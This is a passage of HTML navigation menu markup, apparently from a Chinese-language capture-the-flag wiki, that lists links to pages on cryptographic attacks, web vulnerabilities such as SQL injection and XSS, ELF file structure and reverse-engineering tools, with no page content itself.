md-icon"></span> Simon and Speck </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/simon-speck/ class=md-nav__link> Simon and Speck Block Ciphers </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-7 type=checkbox id=nav-4-5-7> <label class=md-nav__link for=nav-4-5-7> 分組模式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=分組模式 data-md-level=3> <label class=md-nav__title for=nav-4-5-7> <span class="md-nav__icon md-icon"></span> 分組模式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/introduction/ class=md-nav__link> 分組模式 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/padding/ class=md-nav__link> 填充方式 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/ecb/ class=md-nav__link> ECB </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/cbc/ class=md-nav__link> CBC </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/pcbc/ class=md-nav__link> PCBC </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/cfb/ class=md-nav__link> CFB </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/ofb/ class=md-nav__link> OFB </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/ctr/ class=md-nav__link> CTR </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/padding-oracle-attack/ class=md-nav__link> Padding Oracle Attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6 type=checkbox id=nav-4-6> <label class=md-nav__link for=nav-4-6> 非對稱加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=非對稱加密 data-md-level=2> <label class=md-nav__title for=nav-4-6> <span class="md-nav__icon md-icon"></span> 非對稱加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/introduction/ class=md-nav__link> 介紹 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-2 type=checkbox id=nav-4-6-2> <label class=md-nav__link for=nav-4-6-2> RSA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=RSA data-md-level=3> <label class=md-nav__title for=nav-4-6-2> <span class="md-nav__icon md-icon"></span> RSA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_theory/ class=md-nav__link> RSA 介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_module_attack/ class=md-nav__link> 模數相關攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_e_attack/ class=md-nav__link> 公鑰指數相關攻擊 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-2-4 type=checkbox id=nav-4-6-2-4> <label class=md-nav__link for=nav-4-6-2-4> 私鑰d相關攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=私鑰d相關攻擊 data-md-level=4> <label class=md-nav__title for=nav-4-6-2-4> <span class="md-nav__icon md-icon"></span> 私鑰d相關攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/d_attacks/rsa_d_attack/ class=md-nav__link> 私鑰 d 相關攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener/ class=md-nav__link> 擴展維納攻擊 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/ class=md-nav__link> Coppersmith 相關攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/ class=md-nav__link> RSA 選擇明密文攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_side_channel/ class=md-nav__link> RSA 側信道攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/ class=md-nav__link> Bleichenbacher's attack </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_complex/ class=md-nav__link> RSA 複雜題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-3 type=checkbox id=nav-4-6-3> <label class=md-nav__link for=nav-4-6-3> 揹包加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=揹包加密 data-md-level=3> <label class=md-nav__title for=nav-4-6-3> <span class="md-nav__icon md-icon"></span> 揹包加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/knapsack/knapsack/ class=md-nav__link> 揹包加密 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-4 type=checkbox id=nav-4-6-4> <label class=md-nav__link for=nav-4-6-4> 離散對數相關 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=離散對數相關 data-md-level=3> <label class=md-nav__title for=nav-4-6-4> <span class="md-nav__icon md-icon"></span> 離散對數相關 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/discrete-log/discrete-log/ class=md-nav__link> 離散對數 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/discrete-log/elgamal/ class=md-nav__link> ElGamal </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/discrete-log/ecc/ class=md-nav__link> ECC </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-5 type=checkbox id=nav-4-6-5> <label class=md-nav__link for=nav-4-6-5> 格密碼 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=格密碼 data-md-level=3> <label class=md-nav__title for=nav-4-6-5> <span class="md-nav__icon md-icon"></span> 格密碼 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/lattice/overview/ class=md-nav__link> 格概述 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/lattice/introduction/ class=md-nav__link> 基本介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/lattice/lattice-reduction/ class=md-nav__link> 格基規約算法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/lattice/cvp/ class=md-nav__link> CVP </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7 type=checkbox id=nav-4-7> <label class=md-nav__link for=nav-4-7> 哈希函數 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=哈希函數 data-md-level=2> <label class=md-nav__title for=nav-4-7> <span class="md-nav__icon md-icon"></span> 哈希函數 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/introduction/ class=md-nav__link> 哈希函數 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-2 type=checkbox id=nav-4-7-2> <label class=md-nav__link for=nav-4-7-2> MD5 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MD5 data-md-level=3> <label class=md-nav__title for=nav-4-7-2> <span class="md-nav__icon md-icon"></span> MD5 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/md5/ class=md-nav__link> MD5 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-3 type=checkbox id=nav-4-7-3> <label class=md-nav__link for=nav-4-7-3> SHA1 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SHA1 data-md-level=3> <label class=md-nav__title for=nav-4-7-3> <span class="md-nav__icon md-icon"></span> SHA1 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/sha1/ class=md-nav__link> SHA1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-4 type=checkbox id=nav-4-7-4> <label class=md-nav__link for=nav-4-7-4> FNV <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=FNV data-md-level=3> <label class=md-nav__title for=nav-4-7-4> <span class="md-nav__icon md-icon"></span> FNV </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/fnv/ class=md-nav__link> Fowler–Noll–Vo hash function </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-5 type=checkbox id=nav-4-7-5> <label class=md-nav__link for=nav-4-7-5> Hash Attack <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hash Attack" data-md-level=3> <label class=md-nav__title for=nav-4-7-5> <span class="md-nav__icon md-icon"></span> Hash Attack </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/attack/ class=md-nav__link> Hash Attack </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/complex/ class=md-nav__link> 綜合題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8 type=checkbox id=nav-4-8> <label class=md-nav__link for=nav-4-8> 數字簽名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=數字簽名 data-md-level=2> <label class=md-nav__title for=nav-4-8> <span class="md-nav__icon md-icon"></span> 數字簽名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/signature/introduction/ class=md-nav__link> 數字簽名 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-2 type=checkbox id=nav-4-8-2> <label class=md-nav__link for=nav-4-8-2> RSA 數字簽名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="RSA 數字簽名" data-md-level=3> <label class=md-nav__title for=nav-4-8-2> <span class="md-nav__icon md-icon"></span> RSA 數字簽名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/signature/rsa/ class=md-nav__link> RSA 數字簽名 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-3 type=checkbox id=nav-4-8-3> <label class=md-nav__link for=nav-4-8-3> ElGamal 數字簽名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ElGamal 數字簽名" data-md-level=3> <label class=md-nav__title for=nav-4-8-3> <span class="md-nav__icon md-icon"></span> ElGamal 數字簽名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/signature/elgamal/ class=md-nav__link> ElGamal </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-4 type=checkbox id=nav-4-8-4> <label class=md-nav__link for=nav-4-8-4> DSA 數字簽名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="DSA 數字簽名" data-md-level=3> <label class=md-nav__title for=nav-4-8-4> <span class="md-nav__icon md-icon"></span> DSA 數字簽名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/signature/dsa/ class=md-nav__link> DSA </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9 type=checkbox id=nav-4-9> <label class=md-nav__link for=nav-4-9> 攻擊思想總結 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=攻擊思想總結 data-md-level=2> <label class=md-nav__title for=nav-4-9> <span class="md-nav__icon md-icon"></span> 攻擊思想總結 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/attack-summary/attack-mode/ class=md-nav__link> 簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9-2 type=checkbox id=nav-4-9-2> <label class=md-nav__link for=nav-4-9-2> 中間相遇攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=中間相遇攻擊 data-md-level=3> <label class=md-nav__title for=nav-4-9-2> <span class="md-nav__icon md-icon"></span> 中間相遇攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/attack-summary/meet-in-the-middle/ class=md-nav__link> 中間相遇攻擊 - MITM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9-3 type=checkbox id=nav-4-9-3> <label class=md-nav__link for=nav-4-9-3> 比特攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=比特攻擊 data-md-level=3> <label class=md-nav__title for=nav-4-9-3> <span class="md-nav__icon md-icon"></span> 比特攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/attack-summary/bit-attack/ class=md-nav__link> 比特攻擊 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-10 type=checkbox id=nav-4-10> <label class=md-nav__link for=nav-4-10> 證書格式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=證書格式 data-md-level=2> <label class=md-nav__title for=nav-4-10> <span class="md-nav__icon md-icon"></span> 證書格式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/certificate/introduction/ class=md-nav__link> 證書格式 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5 type=checkbox id=nav-5> <label class=md-nav__link for=nav-5> Web <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=1> <label class=md-nav__title for=nav-5> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/introduction/ class=md-nav__link> Web 簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-2 type=checkbox id=nav-5-2> <label class=md-nav__link for=nav-5-2> SQL 注入 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SQL 注入" data-md-level=2> <label class=md-nav__title for=nav-5-2> <span class="md-nav__icon md-icon"></span> SQL 注入 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/sqli/ class=md-nav__link> SQL 注入 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-3 type=checkbox id=nav-5-3> <label class=md-nav__link for=nav-5-3> XSS 跨站腳本攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="XSS 跨站腳本攻擊" data-md-level=2> <label class=md-nav__title for=nav-5-3> <span class="md-nav__icon md-icon"></span> XSS 跨站腳本攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/xss/ class=md-nav__link> XSS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-4 type=checkbox id=nav-5-4> <label class=md-nav__link for=nav-5-4> CSRF 跨站請求僞造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="CSRF 跨站請求僞造" data-md-level=2> <label class=md-nav__title for=nav-5-4> <span class="md-nav__icon md-icon"></span> CSRF 跨站請求僞造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/csrf/ class=md-nav__link> CSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-5 type=checkbox id=nav-5-5> <label class=md-nav__link for=nav-5-5> SSRF 服務端請求僞造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SSRF 服務端請求僞造" data-md-level=2> <label class=md-nav__title for=nav-5-5> <span class="md-nav__icon md-icon"></span> SSRF 服務端請求僞造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/ssrf/ class=md-nav__link> SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-6 type=checkbox id=nav-5-6> <label class=md-nav__link for=nav-5-6> PHP 代碼審計 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="PHP 代碼審計" data-md-level=2> <label class=md-nav__title for=nav-5-6> <span class="md-nav__icon md-icon"></span> PHP 代碼審計 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/php/php/ class=md-nav__link> PHP 代碼審計 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6 type=checkbox id=nav-6> <label class=md-nav__link for=nav-6> Assembly <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Assembly data-md-level=1> <label class=md-nav__title for=nav-6> <span class="md-nav__icon md-icon"></span> Assembly </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../assembly/x86-x64/readme/ class=md-nav__link> x86_x64 </a> </li> <li class=md-nav__item> <a href=../../../../../../../assembly/mips/readme/ class=md-nav__link> MIPS </a> </li> <li class=md-nav__item> <a href=../../../../../../../assembly/arm/readme/ class=md-nav__link> ARM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7 type=checkbox id=nav-7> <label class=md-nav__link for=nav-7> Executable <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Executable data-md-level=1> <label class=md-nav__title for=nav-7> <span class="md-nav__icon md-icon"></span> Executable </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1 type=checkbox id=nav-7-1> <label class=md-nav__link for=nav-7-1> ELF 文件 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件" data-md-level=2> <label class=md-nav__title for=nav-7-1> <span class="md-nav__icon md-icon"></span> ELF 文件 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-1 type=checkbox id=nav-7-1-1> <label class=md-nav__link for=nav-7-1-1> ELF 文件基本結構 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件基本結構" data-md-level=3> <label class=md-nav__title for=nav-7-1-1> <span class="md-nav__icon md-icon"></span> ELF 文件基本結構 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/basic-info/ class=md-nav__link> ELF 文件 </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/sections/ class=md-nav__link> Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/code-sections/ class=md-nav__link> Code Section </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/data-related-sections/ class=md-nav__link> Data Related Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/symbol-table/ class=md-nav__link> .symtab: Symbol Table </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/strings-sections/ class=md-nav__link> String Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/dynamic-sections/ class=md-nav__link> Dynamic Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/misc-sections/ class=md-nav__link> Misc Sections </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-2 type=checkbox id=nav-7-1-2> <label class=md-nav__link for=nav-7-1-2> 程序加載 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序加載 data-md-level=3> <label class=md-nav__title for=nav-7-1-2> <span class="md-nav__icon md-icon"></span> 程序加載 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../executable/elf/program-loading/ class=md-nav__link> 程序加載 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-3 type=checkbox id=nav-7-1-3> <label class=md-nav__link for=nav-7-1-3> 程序鏈接 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序鏈接 data-md-level=3> <label class=md-nav__title for=nav-7-1-3> <span class="md-nav__icon md-icon"></span> 程序鏈接 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../executable/elf/linking/program-linking/ class=md-nav__link> 程序鏈接 </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/linking/symbol-resolve/ class=md-nav__link> Symbol Reslove </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-4 type=checkbox id=nav-7-1-4> <label class=md-nav__link for=nav-7-1-4> 程序執行流程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序執行流程 data-md-level=3> <label class=md-nav__title for=nav-7-1-4> <span class="md-nav__icon md-icon"></span> 程序執行流程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../executable/elf/running-overview/ class=md-nav__link> 程序執行流程 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8 type=checkbox id=nav-8> <label class=md-nav__link for=nav-8> Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Reverse data-md-level=1> <label class=md-nav__title for=nav-8> <span class="md-nav__icon md-icon"></span> Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-1 type=checkbox id=nav-8-1> <label class=md-nav__link for=nav-8-1> Reverse Overview <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Reverse Overview" data-md-level=2> <label class=md-nav__title for=nav-8-1> <span class="md-nav__icon md-icon"></span> Reverse Overview </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/introduction/ class=md-nav__link> 軟件逆向工程簡介 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2 type=checkbox id=nav-8-2> <label class=md-nav__link for=nav-8-2> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=2> <label class=md-nav__title for=nav-8-2> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-1 type=checkbox id=nav-8-2-1> <label class=md-nav__link for=nav-8-2-1> 靜態分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=靜態分析 data-md-level=3> <label class=md-nav__title for=nav-8-2-1> <span class="md-nav__icon md-icon"></span> 靜態分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/static-analyze/ida/ class=md-nav__link> IDA Pro </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/static-analyze/ghidra/ class=md-nav__link> Ghidra </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/static-analyze/jadx/ class=md-nav__link> jadx </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/static-analyze/dnspy/ class=md-nav__link> Dnspy </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-2 type=checkbox id=nav-8-2-2> <label class=md-nav__link for=nav-8-2-2> 動態調試 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=動態調試 data-md-level=3> <label class=md-nav__title for=nav-8-2-2> <span class="md-nav__icon md-icon"></span> 動態調試 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/debug/gdb/ class=md-nav__link> gdb </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/debug/ollydbg/ class=md-nav__link> ollydbg </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/debug/xdbg/ class=md-nav__link> x64dbg/x32dbg </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/debug/windbg/ class=md-nav__link> windbg </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-3 type=checkbox id=nav-8-2-3> <label class=md-nav__link for=nav-8-2-3> 約束求解 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=約束求解 data-md-level=3> <label class=md-nav__title for=nav-8-2-3> <span class="md-nav__icon md-icon"></span> 約束求解 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/constraint/z3/ class=md-nav__link> z3 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-4 type=checkbox id=nav-8-2-4> <label class=md-nav__link for=nav-8-2-4> 模擬執行 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=模擬執行 data-md-level=3> <label class=md-nav__title for=nav-8-2-4> <span class="md-nav__icon md-icon"></span> 模擬執行 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/simulate-execution/angr/ class=md-nav__link> angr </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/simulate-execution/unicorn/ class=md-nav__link> Unicorn Engine </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-3 type=checkbox id=nav-8-3> <label class=md-nav__link for=nav-8-3> 算法逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=算法逆向 data-md-level=2> <label class=md-nav__title for=nav-8-3> <span class="md-nav__icon md-icon"></span> 算法逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/identify-encode-encryption/introduction/ class=md-nav__link> 常見加密算法和編碼識別 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-4 type=checkbox id=nav-8-4> <label class=md-nav__link for=nav-8-4> 代碼混淆 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=代碼混淆 data-md-level=2> <label class=md-nav__title for=nav-8-4> <span class="md-nav__icon md-icon"></span> 代碼混淆 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/obfuscate/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/obfuscate/smc/ class=md-nav__link> Self-Modified Code </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/obfuscate/control-flow-flatten/ class=md-nav__link> 控制流平坦化 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/obfuscate/movfuscator/ class=md-nav__link> movofuscator </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-5 type=checkbox id=nav-8-5> <label class=md-nav__link for=nav-8-5> 迷宮逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=迷宮逆向 data-md-level=2> <label class=md-nav__title for=nav-8-5> <span class="md-nav__icon md-icon"></span> 迷宮逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/maze/maze/ class=md-nav__link> 迷宮問題 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle 